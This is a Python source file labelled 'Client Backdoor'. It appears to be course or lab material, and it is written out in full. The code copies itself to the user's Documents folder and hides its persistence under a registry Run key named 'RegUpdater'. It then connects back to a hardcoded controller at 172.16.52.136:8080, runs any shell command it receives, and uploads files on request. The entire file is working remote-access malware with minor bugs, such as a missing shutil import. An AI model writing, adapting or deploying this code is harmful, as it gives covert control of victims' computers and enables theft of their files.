#Client Backdoor

import socket 
import subprocess 
import os
import _winreg as wreg

path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'

if not os.path.exists(destination):  

    shutil.copyfile(path+'\persistence.exe', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
                                                         # and we will get the same result
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()



def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: 
        s.send('Unable to find out the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('172.16.52.136', 8080)) 
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


        elif 'grab' in command: 
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )
                pass
        


        elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
            code,directory = command.split (' ') # split up the reiceved command based on space into two variables
            os.chdir(directory) # changing the directory 
            s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD

            
        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect() 
main()
